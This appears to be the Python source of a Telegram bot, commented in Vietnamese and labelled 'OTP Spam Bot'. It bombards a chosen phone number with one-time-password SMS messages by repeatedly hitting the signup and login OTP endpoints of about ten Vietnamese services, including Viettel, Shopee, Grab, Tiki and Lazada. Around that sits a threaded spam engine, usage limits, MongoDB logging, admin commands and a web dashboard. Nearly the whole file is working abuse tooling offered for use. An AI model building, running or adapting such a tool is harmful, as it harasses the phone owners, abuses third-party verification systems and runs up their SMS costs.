import telebot
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import threading
import os
import time
import sys
import random
import requests
import json
from datetime import datetime, timedelta
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from threading import BoundedSemaphore, Lock
import concurrent.futures
from pymongo import MongoClient
import logging
from functools import wraps
import asyncio
import aiohttp
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import hashlib
import urllib3

# Tắt warnings và import colorama nếu có
try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Tạo các biến giả để không bị lỗi
    class FakeColorama:
        def __getattr__(self, name):
            return ''
    Fore = Back = Style = FakeColorama()

# Tắt cảnh báo SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================
# CẤU HÌNH
# ==============================

TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    print("❌ Lỗi: TELEGRAM_BOT_TOKEN không được cấu hình!")
    print("👉 Thiết lập biến môi trường: TELEGRAM_BOT_TOKEN=your_token_here")
    sys.exit(1)

ADMIN_IDS = []
admin_ids_str = os.getenv('ADMIN_IDS', '')
if admin_ids_str:
    try:
        ADMIN_IDS = list(map(int, admin_ids_str.split(',')))
    except:
        print("⚠️ Cảnh báo: ADMIN_IDS không đúng định dạng!")

MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
DATABASE_NAME = 'otp_spam_bot'

# Cấu hình hiệu suất
MAX_THREADS = int(os.getenv('MAX_THREADS', 100))
MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', 50))
REQUEST_TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', 5))
MAX_RETRIES = int(os.getenv('MAX_RETRIES', 1))
SESSION_POOL_SIZE = int(os.getenv('SESSION_POOL_SIZE', 10))

MAX_SPAM_PER_PHONE = int(os.getenv('MAX_SPAM_PER_PHONE', 200))
SPAM_COOLDOWN_HOURS = int(os.getenv('SPAM_COOLDOWN_HOURS', 1))

# Khởi tạo
bot = telebot.TeleBot(TOKEN, threaded=True)
app = Flask(__name__)

# Biến toàn cục
active_spams_lock = threading.Lock()
active_spams = {}
request_sessions = []
is_spamming_active = True

# ==============================
# KHỞI TẠO DATABASE
# ==============================

def init_database():
    """Khởi tạo kết nối MongoDB"""
    try:
        client = MongoClient(
            MONGODB_URI,
            maxPoolSize=50,
            socketTimeoutMS=10000,
            connectTimeoutMS=10000
        )
        
        # Test connection
        client.admin.command('ping')
        print(f"{Fore.GREEN}✅ Kết nối MongoDB thành công!{Fore.RESET}")
        
        db = client[DATABASE_NAME]
        
        # Tạo collections
        users_collection = db['users']
        spam_history_collection = db['spam_history']
        blocked_phones_collection = db['blocked_phones']
        
        # Tạo index
        users_collection.create_index([('user_id', 1)], unique=True)
        users_collection.create_index([('phone', 1)])
        spam_history_collection.create_index([('timestamp', -1)])
        blocked_phones_collection.create_index([('phone', 1)], unique=True)
        
        return {
            'users': users_collection,
            'spam_history': spam_history_collection,
            'blocked_phones': blocked_phones_collection,
            'client': client
        }
        
    except Exception as e:
        print(f"{Fore.RED}❌ Lỗi kết nối MongoDB: {e}{Fore.RESET}")
        print(f"{Fore.YELLOW}⚠️ Bot sẽ chạy mà không có database...{Fore.RESET}")
        return None

# Khởi tạo database
db = init_database()

# ==============================
# TIỆN ÍCH
# ==============================

def format_phone_number(phone):
    """Chuẩn hóa số điện thoại"""
    phone = str(phone).strip()
    if phone.startswith('0'):
        return '84' + phone[1:]
    elif phone.startswith('+84'):
        return phone[1:]
    elif not phone.startswith('84'):
        return '84' + phone
    return phone

def admin_only(func):
    """Decorator chỉ cho phép admin"""
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        if message.from_user.id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Bạn không có quyền sử dụng lệnh này!")
            return
        return func(message, *args, **kwargs)
    return wrapper

# ==============================
# OTP FUNCTIONS - TỐI ƯU TỐC ĐỘ
# ==============================

def create_fast_session():
    """Tạo session tối ưu cho requests"""
    session = requests.Session()
    
    adapter = HTTPAdapter(
        pool_connections=20,
        pool_maxsize=20,
        max_retries=Retry(
            total=1,
            backoff_factor=0.1,
            status_forcelist=[429, 500, 502, 503, 504]
        )
    )
    
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Headers tối ưu
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }
    
    session.headers.update(headers)
    return session

# Các hàm OTP tối ưu
def send_otp_via_viettel_fast(sdt):
    """Viettel - Tối ưu"""
    try:
        session = create_fast_session()
        json_data = {'phone': sdt, 'typeCode': 'DI_DONG', 'type': 'otp_login'}
        response = session.post(
            'https://viettel.vn/api/getOTPLoginCommon',
            json=json_data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_shopee_fast(sdt):
    """Shopee - Tối ưu"""
    try:
        session = create_fast_session()
        json_data = {'operation': 8, 'phone': sdt, 'support_session': True}
        response = session.post(
            'https://shopee.vn/api/v4/otp/get_settings_v2',
            json=json_data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_tgdd_fast(sdt):
    """Thế giới di động - Tối ưu"""
    try:
        session = create_fast_session()
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        response = session.post(
            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            data=data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_fptshop_fast(sdt):
    """FPT Shop - Tối ưu"""
    try:
        session = create_fast_session()
        json_data = {'phoneNumber': sdt, 'otpType': '0', 'fromSys': 'WEBKHICT'}
        response = session.post(
            'https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
            json=json_data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_viettelpost_fast(sdt):
    """Viettel Post - Tối ưu"""
    try:
        session = create_fast_session()
        data = {'FormRegister.Phone': sdt, 'ConfirmOtpType': 'Register'}
        response = session.post(
            'https://id.viettelpost.vn/Account/SendOTPByPhone',
            data=data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_ghn_fast(sdt):
    """GHN - Tối ưu"""
    try:
        session = create_fast_session()
        json_data = {'phone': sdt, 'type': 'register'}
        response = session.post(
            'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
            json=json_data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_foody_fast(sdt):
    """Foody - Tối ưu"""
    try:
        session = create_fast_session()
        json_data = {'EmailOrPhoneNumber': sdt, 'Application': 'FoodyWeb'}
        response = session.post(
            'https://www.foody.vn/account/registerandsendactivatecode',
            json=json_data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_grab_fast(sdt):
    """Grab - Tối ưu"""
    try:
        session = create_fast_session()
        json_data = {'phoneNumber': sdt, 'countryCode': 'VN', 'method': 'sms'}
        response = session.post(
            'https://grab.com/api/auth/v3/otp',
            json=json_data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_tiki_fast(sdt):
    """Tiki - Tối ưu"""
    try:
        session = create_fast_session()
        json_data = {'phone': sdt, 'channel': 'sms'}
        response = session.post(
            'https://api.tiki.vn/tiniapi/oauth/otp',
            json=json_data,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_lazada_fast(sdt):
    """Lazada - Tối ưu"""
    try:
        session = create_fast_session()
        params = {'country': 'VN', 'phoneNumber': sdt, 'scene': 'register'}
        response = session.get(
            'https://member.lazada.vn/user/sendRegisterVerifyCode',
            params=params,
            timeout=3,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

# Danh sách các hàm OTP tối ưu
FAST_OTP_FUNCTIONS = [
    send_otp_via_viettel_fast,
    send_otp_via_shopee_fast,
    send_otp_via_tgdd_fast,
    send_otp_via_fptshop_fast,
    send_otp_via_viettelpost_fast,
    send_otp_via_ghn_fast,
    send_otp_via_foody_fast,
    send_otp_via_grab_fast,
    send_otp_via_tiki_fast,
    send_otp_via_lazada_fast,
]

# ==============================
# SPAM ENGINE
# ==============================

class UltraSpamEngine:
    """Engine spam siêu tốc"""
    
    def __init__(self):
        self.results = {'success': 0, 'failed': 0}
        self.lock = threading.Lock()
        
    def spam_single(self, phone):
        """Spam một lần"""
        func = random.choice(FAST_OTP_FUNCTIONS)
        try:
            if func(phone):
                with self.lock:
                    self.results['success'] += 1
                return True
            else:
                with self.lock:
                    self.results['failed'] += 1
                return False
        except:
            with self.lock:
                self.results['failed'] += 1
            return False
    
    def spam_batch(self, phone, count, spam_id):
        """Spam một batch"""
        results = {'success': 0, 'failed': 0}
        
        for i in range(count):
            # Kiểm tra nếu spam đã bị dừng
            with active_spams_lock:
                if spam_id not in active_spams or not active_spams[spam_id].get('is_running', True):
                    break
            
            # Spam
            func = random.choice(FAST_OTP_FUNCTIONS)
            try:
                if func(phone):
                    results['success'] += 1
                else:
                    results['failed'] += 1
            except:
                results['failed'] += 1
            
            # Thông báo tiến độ mỗi 10 lần
            if (i + 1) % 10 == 0:
                self._update_progress(spam_id, phone, i + 1, count, results)
        
        return results
    
    def _update_progress(self, spam_id, phone, current, total, results):
        """Cập nhật tiến độ lên Telegram"""
        try:
            with active_spams_lock:
                spam_info = active_spams.get(spam_id)
                if not spam_info:
                    return
                
                chat_id = spam_info.get('chat_id')
                message_id = spam_info.get('message_id')
                
                if not chat_id or not message_id:
                    return
                
                progress = (current / total) * 100
                
                keyboard = InlineKeyboardMarkup()
                keyboard.add(InlineKeyboardButton("❌ Dừng", callback_data=f"stop_{spam_id}"))
                
                bot.edit_message_text(
                    f"⚡ *ĐANG SPAM - {progress:.1f}%*\n\n"
                    f"📱 Số: `{phone}`\n"
                    f"📊 Tiến độ: {current}/{total}\n"
                    f"✅ Thành công: {results['success']}\n"
                    f"❌ Thất bại: {results['failed']}\n"
                    f"⏱️ Đã chạy: {current//10}s",
                    chat_id,
                    message_id,
                    parse_mode='Markdown',
                    reply_markup=keyboard
                )
        except:
            pass

# Khởi tạo engine
spam_engine = UltraSpamEngine()

# ==============================
# TELEGRAM COMMANDS
# ==============================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Lệnh start"""
    welcome_text = f"""
{Fore.GREEN}🚀 OTP SPAM BOT - ULTRA SPEED{Fore.RESET}

{Fore.CYAN}📋 Lệnh có sẵn:{Fore.RESET}
/spam <số điện thoại> [số lần] - Spam OTP
/status - Trạng thái bot
/cancel - Dừng spam đang chạy
/mystats - Thống kê của bạn

{Fore.YELLOW}👑 Lệnh Admin:{Fore.RESET}
/admin - Menu quản trị
/stats - Thống kê tổng quan
/active <on/off> - Bật/tắt bot

{Fore.RED}⚠️ Lưu ý: Chỉ sử dụng cho mục đích hợp pháp!{Fore.RESET}

{Fore.MAGENTA}⚡ Tốc độ: 10+ OTP/giây
🎯 Dịch vụ: {len(FAST_OTP_FUNCTIONS)} websites{Fore.RESET}
    """
    
    # Lưu user vào database nếu có
    if db:
        try:
            db['users'].update_one(
                {'user_id': message.from_user.id},
                {'$set': {
                    'username': message.from_user.username,
                    'first_name': message.from_user.first_name,
                    'last_name': message.from_user.last_name,
                    'last_active': datetime.now(),
                    'is_admin': message.from_user.id in ADMIN_IDS
                }},
                upsert=True
            )
        except:
            pass
    
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['spam'])
def handle_spam(message):
    """Xử lý lệnh spam"""
    global is_spamming_active
    
    if not is_spamming_active:
        bot.reply_to(message, "⏸️ Bot đang tạm dừng!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Sai cú pháp! Sử dụng: /spam <số điện thoại> [số lần]")
            return
        
        phone = parts[1]
        count = int(parts[2]) if len(parts) >= 3 else 20
        
        # Giới hạn số lần
        if message.from_user.id not in ADMIN_IDS:
            count = min(count, 100)  # User thường: max 100 lần
        else:
            count = min(count, 1000)  # Admin: max 1000 lần
        
        # Chuẩn hóa số điện thoại
        phone = format_phone_number(phone)
        
        # Kiểm tra block (nếu có database)
        if db:
            try:
                blocked = db['blocked_phones'].find_one({
                    'phone': phone,
                    'is_active': True
                })
                if blocked:
                    bot.reply_to(message, f"🚫 Số {phone} đã bị block!")
                    return
            except:
                pass
        
        # Thông báo bắt đầu
        msg = bot.reply_to(message, f"🔄 Đang khởi tạo spam cho {phone}...")
        
        # Tạo spam ID
        spam_id = f"{message.from_user.id}_{int(time.time())}"
        
        with active_spams_lock:
            active_spams[spam_id] = {
                'user_id': message.from_user.id,
                'phone': phone,
                'count': count,
                'started_at': datetime.now(),
                'is_running': True,
                'chat_id': message.chat.id,
                'message_id': msg.message_id
            }
        
        # Chạy spam trong thread riêng
        thread = threading.Thread(
            target=run_spam_thread,
            args=(spam_id, phone, count, message.chat.id, msg.message_id),
            daemon=True
        )
        thread.start()
        
        # Nút hủy
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("❌ Dừng spam", callback_data=f"cancel_{spam_id}"))
        
        bot.edit_message_text(
            f"✅ *ĐÃ BẮT ĐẦU SPAM!*\n\n"
            f"📱 Số: `{phone}`\n"
            f"🎯 Số lần: {count}\n"
            f"⚡ Tốc độ: Cực cao\n"
            f"🆔 ID: `{spam_id}`\n\n"
            f"⏳ Đang xử lý...",
            message.chat.id,
            msg.message_id,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {str(e)}")

def run_spam_thread(spam_id, phone, count, chat_id, message_id):
    """Chạy spam trong thread riêng"""
    try:
        start_time = time.time()
        results = spam_engine.spam_batch(phone, count, spam_id)
        
        # Tính thời gian
        elapsed = time.time() - start_time
        speed = count / elapsed if elapsed > 0 else 0
        
        # Hoàn thành
        with active_spams_lock:
            if spam_id in active_spams:
                del active_spams[spam_id]
        
        # Gửi kết quả
        try:
            success_rate = (results['success'] / count * 100) if count > 0 else 0
            
            bot.edit_message_text(
                f"🎉 *HOÀN THÀNH SPAM!*\n\n"
                f"📱 Số: `{phone}`\n"
                f"🎯 Tổng lần: {count}\n"
                f"✅ Thành công: {results['success']}\n"
                f"❌ Thất bại: {results['failed']}\n"
                f"📈 Tỷ lệ: {success_rate:.1f}%\n"
                f"⚡ Tốc độ: {speed:.1f} OTP/giây\n"
                f"⏱️ Thời gian: {elapsed:.1f}s",
                chat_id,
                message_id,
                parse_mode='Markdown'
            )
        except:
            pass
        
        # Lưu vào database nếu có
        if db:
            try:
                # Lưu lịch sử
                db['spam_history'].insert_one({
                    'user_id': chat_id,
                    'phone': phone,
                    'count': count,
                    'success': results['success'],
                    'failed': results['failed'],
                    'timestamp': datetime.now(),
                    'duration': elapsed
                })
                
                # Cập nhật thống kê user
                db['users'].update_one(
                    {'user_id': chat_id},
                    {'$inc': {'total_spam': count, 'success_spam': results['success']}},
                    upsert=True
                )
            except:
                pass
                
    except Exception as e:
        print(f"Error in spam thread: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_'))
def handle_cancel_callback(call):
    """Xử lý hủy spam"""
    spam_id = call.data.replace('cancel_', '')
    
    with active_spams_lock:
        if spam_id in active_spams:
            active_spams[spam_id]['is_running'] = False
            bot.answer_callback_query(call.id, "✅ Đã dừng spam!")
            
            # Xóa nút
            try:
                bot.edit_message_reply_markup(
                    call.message.chat.id,
                    call.message.message_id,
                    reply_markup=None
                )
                bot.edit_message_text(
                    "⏹️ Đã dừng spam!",
                    call.message.chat.id,
                    call.message.message_id
                )
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ Không tìm thấy spam!")

@bot.message_handler(commands=['cancel'])
def handle_cancel_command(message):
    """Hủy spam của user"""
    user_id = message.from_user.id
    
    with active_spams_lock:
        user_spams = [k for k, v in active_spams.items() 
                     if v.get('user_id') == user_id and v.get('is_running', True)]
        
        for spam_id in user_spams:
            active_spams[spam_id]['is_running'] = False
    
    bot.reply_to(message, f"✅ Đã hủy {len(user_spams)} spam đang chạy!")

@bot.message_handler(commands=['status'])
def handle_status(message):
    """Trạng thái bot"""
    global is_spamming_active
    
    with active_spams_lock:
        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
        total_queued = sum(s.get('count', 0) for s in active_spams.values())
    
    status_text = (
        f"🤖 *TRẠNG THÁI BOT*\n"
        f"┌─────────────────\n"
        f"│ Trạng thái: {'✅ Đang hoạt động' if is_spamming_active else '⏸️ Đã tạm dừng'}\n"
        f"│ Spam đang chạy: {active_count}\n"
        f"│ OTP trong queue: {total_queued}\n"
        f"│ Dịch vụ: {len(FAST_OTP_FUNCTIONS)}\n"
        f"│ Max Threads: {MAX_THREADS}\n"
        f"│ User ID: `{message.from_user.id}`\n"
        f"└─────────────────"
    )
    
    bot.reply_to(message, status_text, parse_mode='Markdown')

@bot.message_handler(commands=['mystats'])
def handle_mystats(message):
    """Thống kê của user"""
    user_id = message.from_user.id
    
    if db:
        try:
            user_info = db['users'].find_one({'user_id': user_id})
            
            if user_info:
                total_spam = user_info.get('total_spam', 0)
                success_spam = user_info.get('success_spam', 0)
                
                stats_text = (
                    f"📊 *THỐNG KÊ CỦA BẠN*\n"
                    f"┌─────────────────\n"
                    f"│ User ID: `{user_id}`\n"
                    f"│ Username: @{user_info.get('username', 'N/A')}\n"
                    f"│ Tổng lần spam: {total_spam}\n"
                    f"│ Thành công: {success_spam}\n"
                    f"│ Tỷ lệ: {(success_spam/total_spam*100 if total_spam>0 else 0):.1f}%\n"
                    f"│ Lần hoạt động: {user_info.get('last_active', 'N/A')}\n"
                    f"└─────────────────"
                )
            else:
                stats_text = "📭 Bạn chưa có thống kê nào!"
        except:
            stats_text = "❌ Lỗi khi lấy thống kê!"
    else:
        stats_text = "📭 Database không khả dụng!"
    
    bot.reply_to(message, stats_text, parse_mode='Markdown')

# ==============================
# ADMIN COMMANDS
# ==============================

@bot.message_handler(commands=['admin'])
@admin_only
def handle_admin(message):
    """Menu admin"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📊 Thống kê", callback_data="admin_stats"),
        InlineKeyboardButton("👥 Users", callback_data="admin_users"),
        InlineKeyboardButton("⚙️ Cài đặt", callback_data="admin_settings"),
        InlineKeyboardButton("📱 Phones", callback_data="admin_phones")
    )
    
    bot.reply_to(message, "👑 *ADMIN PANEL*", 
                parse_mode='Markdown', reply_markup=keyboard)

@bot.message_handler(commands=['stats'])
@admin_only
def handle_admin_stats(message):
    """Thống kê tổng quan"""
    if db:
        try:
            total_users = db['users'].count_documents({})
            total_spams = db['spam_history'].count_documents({})
            blocked_phones = db['blocked_phones'].count_documents({'is_active': True})
            
            # Thống kê 24h
            yesterday = datetime.now() - timedelta(days=1)
            spams_today = db['spam_history'].count_documents({
                'timestamp': {'$gte': yesterday}
            })
            
            stats_text = (
                f"📈 *THỐNG KÊ TỔNG QUAN*\n"
                f"┌─────────────────\n"
                f"│ Tổng users: {total_users}\n"
                f"│ Tổng lần spam: {total_spams}\n"
                f"│ Spam 24h: {spams_today}\n"
                f"│ Số bị block: {blocked_phones}\n"
                f"│ Spam đang chạy: {len(active_spams)}\n"
                f"└─────────────────"
            )
        except:
            stats_text = "❌ Lỗi khi lấy thống kê!"
    else:
        stats_text = "📭 Database không khả dụng!"
    
    bot.reply_to(message, stats_text, parse_mode='Markdown')

@bot.message_handler(commands=['active'])
@admin_only
def handle_active_toggle(message):
    """Bật/tắt bot"""
    global is_spamming_active
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, 
                    f"⚠️ Sử dụng: /active <on/off>\n"
                    f"Trạng thái hiện tại: {'ON' if is_spamming_active else 'OFF'}")
        return
    
    action = parts[1].lower()
    
    if action in ['on', 'true', '1', 'start']:
        is_spamming_active = True
        bot.reply_to(message, "✅ Đã bật bot!")
    elif action in ['off', 'false', '0', 'stop']:
        is_spamming_active = False
        
        # Dừng tất cả spam đang chạy
        with active_spams_lock:
            for spam_id in active_spams:
                active_spams[spam_id]['is_running'] = False
        
        bot.reply_to(message, "⏸️ Đã tắt bot!")
    else:
        bot.reply_to(message, "⚠️ Sai cú pháp! Sử dụng: /active <on/off>")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def handle_admin_callbacks(call):
    """Xử lý callback admin"""
    try:
        action = call.data.replace('admin_', '')
        
        if action == 'stats':
            handle_admin_stats(call.message)
        elif action == 'users':
            if db:
                try:
                    users = list(db['users'].find().limit(10))
                    
                    if users:
                        users_text = "👥 *TOP 10 USERS*\n\n"
                        for i, user in enumerate(users, 1):
                            users_text += (
                                f"{i}. @{user.get('username', 'N/A')}\n"
                                f"   └ Spam: {user.get('total_spam', 0)}\n"
                            )
                    else:
                        users_text = "📭 Chưa có user nào!"
                except:
                    users_text = "❌ Lỗi khi lấy danh sách users!"
            else:
                users_text = "📭 Database không khả dụng!"
            
            bot.edit_message_text(users_text, call.message.chat.id,
                                call.message.message_id, parse_mode='Markdown')
            
        elif action == 'settings':
            settings_text = (
                f"⚙️ *CÀI ĐẶT HỆ THỐNG*\n\n"
                f"• MAX_THREADS: {MAX_THREADS}\n"
                f"• MAX_CONCURRENT: {MAX_CONCURRENT_REQUESTS}\n"
                f"• REQUEST_TIMEOUT: {REQUEST_TIMEOUT}s\n"
                f"• MAX_SPAM_PER_PHONE: {MAX_SPAM_PER_PHONE}\n"
                f"• COOLDOWN: {SPAM_COOLDOWN_HOURS} giờ\n"
                f"• OTP SERVICES: {len(FAST_OTP_FUNCTIONS)}\n"
                f"• BOT STATUS: {'🟢 ACTIVE' if is_spamming_active else '🔴 INACTIVE'}"
            )
            
            bot.edit_message_text(settings_text, call.message.chat.id,
                                call.message.message_id, parse_mode='Markdown')
            
        elif action == 'phones':
            if db:
                try:
                    # Lấy top số điện thoại spam nhiều nhất
                    pipeline = [
                        {'$group': {'_id': '$phone', 'count': {'$sum': '$count'}}},
                        {'$sort': {'count': -1}},
                        {'$limit': 10}
                    ]
                    
                    top_phones = list(db['spam_history'].aggregate(pipeline))
                    
                    if top_phones:
                        phones_text = "📱 *TOP 10 SỐ ĐIỆN THOẠI*\n\n"
                        for i, phone in enumerate(top_phones, 1):
                            phones_text += f"{i}. {phone['_id']}: {phone['count']} lần\n"
                    else:
                        phones_text = "📭 Chưa có số điện thoại nào!"
                except:
                    phones_text = "❌ Lỗi khi lấy danh sách số!"
            else:
                phones_text = "📭 Database không khả dụng!"
            
            bot.edit_message_text(phones_text, call.message.chat.id,
                                call.message.message_id, parse_mode='Markdown')
            
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Lỗi: {str(e)[:50]}")

# ==============================
# FLASK SERVER
# ==============================

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>OTP Spam Bot</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                min-height: 100vh;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 15px;
                padding: 30px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            }
            h1 {
                text-align: center;
                margin-bottom: 30px;
                font-size: 2.5em;
            }
            .status-card {
                background: rgba(255, 255, 255, 0.2);
                border-radius: 10px;
                padding: 20px;
                margin: 20px 0;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin: 20px 0;
            }
            .stat-item {
                background: rgba(255, 255, 255, 0.15);
                padding: 15px;
                border-radius: 8px;
                text-align: center;
            }
            .btn {
                display: inline-block;
                background: #4CAF50;
                color: white;
                padding: 10px 20px;
                border-radius: 5px;
                text-decoration: none;
                margin: 5px;
                transition: background 0.3s;
            }
            .btn:hover {
                background: #45a049;
            }
            .btn-stop {
                background: #f44336;
            }
            .btn-stop:hover {
                background: #d32f2f;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 OTP Spam Bot Dashboard</h1>
            
            <div class="status-card">
                <h2>📊 System Status</h2>
                <div class="stats">
                    <div class="stat-item">
                        <h3>Bot Status</h3>
                        <p id="bot-status">Loading...</p>
                    </div>
                    <div class="stat-item">
                        <h3>Active Spams</h3>
                        <p id="active-spams">0</p>
                    </div>
                    <div class="stat-item">
                        <h3>OTP Services</h3>
                        <p>""" + str(len(FAST_OTP_FUNCTIONS)) + """</p>
                    </div>
                    <div class="stat-item">
                        <h3>Max Threads</h3>
                        <p>""" + str(MAX_THREADS) + """</p>
                    </div>
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 30px;">
                <a href="/health" class="btn">Health Check</a>
                <a href="/stats" class="btn">API Stats</a>
                <button onclick="toggleBot()" class="btn btn-stop" id="toggle-btn">Stop Bot</button>
            </div>
            
            <div style="margin-top: 30px; text-align: center;">
                <p>⚡ Ultra Speed Edition | Made with ❤️ for testing purposes only</p>
            </div>
        </div>
        
        <script>
            async function updateStatus() {
                try {
                    const response = await fetch('/health');
                    const data = await response.json();
                    
                    document.getElementById('bot-status').textContent = data.status.toUpperCase();
                    document.getElementById('active-spams').textContent = data.active_spams || 0;
                    
                    // Update button text
                    const btn = document.getElementById('toggle-btn');
                    if (data.status === 'healthy') {
                        btn.textContent = 'Stop Bot';
                        btn.className = 'btn btn-stop';
                    } else {
                        btn.textContent = 'Start Bot';
                        btn.className = 'btn';
                    }
                } catch (error) {
                    console.error('Error fetching status:', error);
                }
            }
            
            async function toggleBot() {
                const btn = document.getElementById('toggle-btn');
                const action = btn.textContent.includes('Stop') ? 'stop' : 'start';
                
                try {
                    const response = await fetch('/' + action, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ action: action })
                    });
                    
                    if (response.ok) {
                        updateStatus();
                    }
                } catch (error) {
                    console.error('Error toggling bot:', error);
                }
            }
            
            // Update status every 5 seconds
            updateStatus();
            setInterval(updateStatus, 5000);
        </script>
    </body>
    </html>
    """

@app.route('/health')
def health():
    """Health check endpoint"""
    with active_spams_lock:
        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
    
    return {
        'status': 'healthy' if is_spamming_active else 'stopped',
        'active_spams': active_count,
        'timestamp': datetime.now().isoformat(),
        'version': 'ultra_speed_1.0',
        'services': len(FAST_OTP_FUNCTIONS)
    }

@app.route('/stats')
def web_stats():
    """Stats endpoint"""
    with active_spams_lock:
        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
        total_queued = sum(s.get('count', 0) for s in active_spams.values())
    
    return {
        'performance': {
            'max_threads': MAX_THREADS,
            'max_concurrent': MAX_CONCURRENT_REQUESTS,
            'otp_services': len(FAST_OTP_FUNCTIONS),
            'request_timeout': REQUEST_TIMEOUT
        },
        'current': {
            'active_spams': active_count,
            'total_queued': total_queued,
            'bot_status': 'active' if is_spamming_active else 'stopped',
            'database': 'connected' if db else 'disconnected'
        }
    }

@app.route('/stop', methods=['POST'])
def stop_bot():
    """Stop bot endpoint"""
    global is_spamming_active
    
    is_spamming_active = False
    
    # Stop all active spams
    with active_spams_lock:
        for spam_id in active_spams:
            active_spams[spam_id]['is_running'] = False
    
    return {'status': 'bot stopped', 'active_spams_stopped': len(active_spams)}

@app.route('/start', methods=['POST'])
def start_bot():
    """Start bot endpoint"""
    global is_spamming_active
    is_spamming_active = True
    return {'status': 'bot started'}

# ==============================
# KHỞI CHẠY
# ==============================

def run_flask():
    """Chạy Flask server"""
    port = int(os.getenv('PORT', 5000))
    print(f"{Fore.CYAN}🌐 Flask server starting on port {port}{Fore.RESET}")
    app.run(host='0.0.0.0', port=port, debug=False)

def run_telegram_bot():
    """Chạy Telegram bot"""
    print(f"{Fore.GREEN}🤖 Starting Telegram Bot...{Fore.RESET}")
    
    try:
        # Test bot connection
        bot_info = bot.get_me()
        print(f"{Fore.GREEN}✅ Bot connected: @{bot_info.username}{Fore.RESET}")
        
        print(f"{Fore.CYAN}⚡ Ultra Speed OTP Spam Bot{Fore.RESET}")
        print(f"{Fore.YELLOW}=============================={Fore.RESET}")
        print(f"{Fore.MAGENTA}• OTP Services: {len(FAST_OTP_FUNCTIONS)}{Fore.RESET}")
        print(f"{Fore.MAGENTA}• Max Threads: {MAX_THREADS}{Fore.RESET}")
        print(f"{Fore.MAGENTA}• Database: {'Connected' if db else 'Not connected'}{Fore.RESET}")
        print(f"{Fore.MAGENTA}• Admins: {len(ADMIN_IDS)} users{Fore.RESET}")
        print(f"{Fore.YELLOW}=============================={Fore.RESET}")
        
        # Start polling
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
        
    except Exception as e:
        print(f"{Fore.RED}❌ Bot error: {e}{Fore.RESET}")
        raise

if __name__ == '__main__':
    # Cấu hình logging
    logging.basicConfig(
        level=logging.WARNING,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Tắt log không cần thiết
    logging.getLogger('requests').setLevel(logging.WARNING)
